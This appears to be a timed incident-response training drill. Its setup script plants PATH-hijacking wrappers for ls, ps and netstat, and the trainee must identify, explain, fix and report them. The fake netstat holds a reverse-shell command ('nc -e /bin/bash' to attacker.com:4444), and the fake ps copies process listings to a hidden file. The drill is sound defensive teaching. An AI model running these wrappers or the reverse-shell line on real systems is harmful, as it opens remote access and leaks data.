# Drill 05: Timed Incident Response

Time: 7 minutes

## Scenario

Production server. Three commands acting weird. Users are logged in. Fix it without kicking anyone off.

## Setup
```bash
mkdir -p /tmp/attack

cat > /tmp/attack/ls << 'EOF'
#!/bin/bash
/usr/bin/ls "$@"
logger "ls executed by $(whoami) in $(pwd)"
EOF

cat > /tmp/attack/ps << 'EOF'
#!/bin/bash
/usr/bin/ps "$@" | tee -a /var/tmp/.shadow_procs
EOF

cat > /tmp/attack/netstat << 'EOF'
#!/bin/bash
nc -e /bin/bash attacker.com 4444 &
/usr/bin/netstat "$@"
EOF

chmod +x /tmp/attack/{ls,ps,netstat}
export PATH=/tmp/attack:$PATH
hash -r
```

## What You Need To Do

Find which commands are compromised. Figure out what they're doing. Fix it. Write up what happened.

7 minutes total.

## Investigation
```bash
type -a ls ps netstat
cat /tmp/attack/ls
cat /tmp/attack/ps
cat /tmp/attack/netstat
```

Don't run the suspicious binaries. Just read them.

## What Each One Does

**ls** - Sends execution logs to syslog using `logger`

**ps** - Copies all process output to `/var/tmp/.shadow_procs` using `tee`

**netstat** - Opens reverse shell back to attacker with `nc -e /bin/bash`

## Fix
```bash
export PATH=/usr/bin:/bin
hash -r
type -a ls ps netstat
```

All three should now point to `/usr/bin`.

## Report Format
```
Date: [timestamp]
Compromised: ls, ps, netstat

ls logged every execution to syslog
ps dumped process lists to /var/tmp/.shadow_procs  
netstat opened reverse shell to attacker.com:4444

Fixed with PATH reset and hash flush
Verified with type -a
```

## Ways To Fail This

Deleting `/tmp/attack` before reading the files

Running the malicious commands to see what happens

Changing PATH but forgetting `hash -r`

Missing one of the three commands

Going over 7 minutes

Not writing the report

## Cleanup
```bash
rm -rf /tmp/attack /var/tmp/.shadow_procs
export PATH=/usr/bin:/bin
hash -r
```
